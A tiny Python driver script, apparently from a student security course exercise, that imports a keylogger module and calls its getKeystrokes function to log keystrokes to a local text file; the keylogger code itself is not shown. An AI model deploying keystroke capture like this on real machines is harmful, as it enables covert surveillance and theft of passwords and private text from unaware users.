import os
from Keyloggers import keylogger1

def main():
    log_dir = r'D:\Documents\PSU Fall 2019\SRA 211'
    log_name = 'applog.txt'

    keylogger1.getKeystrokes(log_dir, log_name)

if __name__== '__main__':
        main()